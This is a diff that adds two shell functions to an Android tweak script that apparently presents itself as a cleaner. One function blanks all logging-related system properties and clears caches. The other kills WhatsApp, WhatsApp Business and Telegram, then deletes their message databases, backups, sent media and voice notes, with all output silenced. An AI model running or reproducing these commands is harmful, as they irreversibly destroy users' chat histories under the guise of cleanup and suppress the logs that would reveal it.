@@ -18,6 +18,33 @@ done
 
 
 
+GarbageCleaner() {
+# By Sukitooo, Thanks Sukitoo
+(for a in $(find /sdcard/ -name .thumbnails;find /sdcard/ -name *.log);do rm -rf $a;done;pm trim-caches 999G)>/dev/null 2>&1&
+(rm -rf /data/data/*/cache;rm -rf /sdcard/Android/data/*/cache)>/dev/null 2>&1&
+for log in $(getprop | grep -E 'log|Log|LOG' | cut -f 2 -d [ | cut -f 1 -d ]); do
+setprop $log ""
+done > /dev/null 2>&1
+}
+
+
+
+Trash() {
+# By Sukitoo, Thanks Sukitoo
+pkill -f com.whatsapp>/dev/null 2>&1
+rm -rf /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/{.Shared,.StickerThumbs,.Thumbs,.trash,Backups,Databases,Media/{.Links,.Statuses,WallPaper,"WhatsApp Animated Gifs","WhatsApp Profile Photos","WhatsApp Audio","WhatsApp Documents/Sent","WhatsApp Images/Sent","WhatsApp Video/Sent","WhatsApp Voice Notes"}}
+rm -rf /storage/emulated/0/Android/data/com.whatsapp
+pkill -f com.whatsapp.w4b>/dev/null 2>&1
+rm -rf /storage/emulated/0/Android/media/com.whatsapp.w4b/"WhatsApp Business"/{.Shared,.StickerThumbs,.Thumbs,.trash,Backups,Databases,Media/{.Links,.Statuses,WallPaper,"WhatsApp Business Animated Gifs","WhatsApp Profile Photos","WhatsApp Business Audio","WhatsApp Business Documents/Sent","WhatsApp Business Images/Sent","WhatsApp Business Video/Sent","WhatsApp Business Voice Notes"}}
+rm -rf /storage/emulated/0/Android/data/com.whatsapp.w4b
+pkill -f org.telegram.messenger>/dev/null 2>&1
+rm -rf /storage/emulated/0/Android/data/org.telegram.messenger/cache
+rm -rf /storage/emulated/0/Android/data/org.telegram.messenger/files/Telegram/{"Telegram Video","Telegram Images"}
+rm -rf /sdcard/*/.thumbnails> /dev/null 2>&1
+}
+
+
+
 Removed_mode_vexz() {
    sleep 2
 for app in $(cat /data/local/tmp/package | cut -f 2 -d ":"); do
